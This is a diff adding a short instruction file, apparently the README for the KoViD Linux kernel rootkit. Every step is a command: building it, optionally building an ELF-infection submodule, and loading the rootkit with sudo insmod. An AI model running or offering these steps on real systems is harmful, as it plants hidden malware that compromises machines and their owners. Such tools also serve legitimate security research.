@@ -1,0 +1,11 @@
+Follow the steps:
+
+# Compile KoViD
+$ make
+
+# If you want to try the included ELF infection
+$ git submodule update --init volundr
+$ make -C volundr
+
+# Install rootkit
+$ sudo insmod ./kovid.ko
